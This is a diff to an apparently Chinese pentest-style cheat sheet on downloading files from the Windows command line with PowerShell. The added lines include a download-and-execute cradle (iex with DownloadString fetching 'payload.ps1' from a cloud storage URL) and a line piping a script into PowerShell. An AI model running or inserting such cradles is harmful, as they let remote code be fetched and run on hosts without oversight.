@@ -16,7 +16,7 @@ title: 命令行文件下载-Windows篇(长期更新)
 踩坑
 
 - Powershell 版本大于`2.0`时 在连接两个命令时 用 **空格** 替换了 `;`
-- Powershell 版本低于或等于`2.0`时 `DownloadFile()`函数不支持自定义保存路径 文件默认保存在`C:\Users\当前用户名` 下![image-20200403122054016](https://tva1.sinaimg.cn/large/00831rSTly1gdggmdhh09j311w0ecdit.jpg)![image-20200403121710725](https://tva1.sinaimg.cn/large/00831rSTly1gdggiiv0ndj30mo0f040i.jpg)
+- Powershell 等于`2.0`时 `DownloadFile()`函数不支持自定义保存路径 文件默认保存在`C:\Users\当前用户名` 下![image-20200403122054016](https://tva1.sinaimg.cn/large/00831rSTly1gdggmdhh09j311w0ecdit.jpg)![image-20200403121710725](https://tva1.sinaimg.cn/large/00831rSTly1gdggiiv0ndj30mo0f040i.jpg)
 
 
 
@@ -34,6 +34,10 @@ powershell (new-object System.Net.WebClient).DownloadFile('http://47.92.194.173/
 ```
 
 `%temp%`指当前登陆用户的临时目录
+
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://ottoknown.oss-cn-qingdao.aliyuncs.com/payload.ps1')"
+
+TYPE payload.ps1 | PowerShell -noprofile -
 
 ---
 
